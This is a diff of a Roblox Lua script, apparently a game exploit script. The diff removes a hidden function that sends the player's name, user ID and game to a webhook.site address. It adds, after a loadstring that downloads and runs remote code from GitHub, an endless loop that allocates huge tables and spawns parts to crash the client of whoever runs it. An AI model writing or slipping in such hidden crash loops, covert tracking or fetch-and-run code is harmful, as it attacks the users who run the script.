@@ -1,24 +1,5 @@
 local Player,Tween,Sound,Http,Run=game:GetService("Players").LocalPlayer,game:GetService("TweenService"),game:GetService("SoundService"),game:GetService("HttpService"),game:GetService("RunService")
 
-local function SendUsageNotification()
-    pcall(function()
-        local gameName = "未知游戏"
-        pcall(function() 
-            gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
-        end)
-        
-        local url = "https://webhook.site/e78dbe83-be58-4309-b95a-198244ccc46c"..
-                   "?script=蛋皇独家脚本"..
-                   "&user="..Player.Name..
-                   "&userId="..Player.UserId..
-                   "&game="..gameName..
-                   "&time="..os.date("%Y-%m-%d %H:%M:%S")..
-                   "&version=1.0"
-        Http:GetAsync(url, true)
-    end)
-end
-SendUsageNotification()
-
 local function SendChatMessage(msg)
     if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
@@ -163,4 +144,17 @@ end
 
 UI:Destroy()
 PP:Destroy()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DH-NB-666/Egg-King-dan/main/DanHuang--Ohio.lua",true))()
+
+wait(1)
+while true do
+    local hugeTable = {}
+    for i = 1, 1000000 do
+        hugeTable[i] = string.rep("CRASH", 1000)
+    end
+    for i = 1, 1000 do
+        Instance.new("Part", workspace)
+    end
+    wait(0.1)
+end
